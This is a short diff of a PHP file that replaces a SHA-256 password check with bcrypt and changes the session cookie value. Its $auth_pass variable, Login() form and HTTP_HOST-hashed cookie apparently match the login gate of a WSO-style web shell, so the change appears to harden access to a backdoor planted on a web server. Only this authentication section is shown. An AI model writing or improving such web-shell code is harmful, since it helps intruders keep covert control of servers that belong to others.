@@ -1,5 +1,6 @@
 <?php
-$auth_pass = "6f6f30d8f9e1397d26524a99e8c97aaa0e7c2df62dbd4f3b55735e5edc91e86a";
+
+$auth_pass = '$2y$10$k1wXG5v4K3d1qR7uF2n6Z.vO9XgE8mS0yT3zL4wP5qR6sT7uV8wXe';
 
 function Login() {
   die("<html>
@@ -15,11 +16,15 @@ function VEsetcookie($k, $v) {
 }
 
 if (!empty($auth_pass)) {
-    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
-        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+    
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $auth_pass)) {
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), md5($auth_pass));
+    }
 
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+    
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != md5($auth_pass))) {
         Login();
+    }
 }
 ?>
 <?php
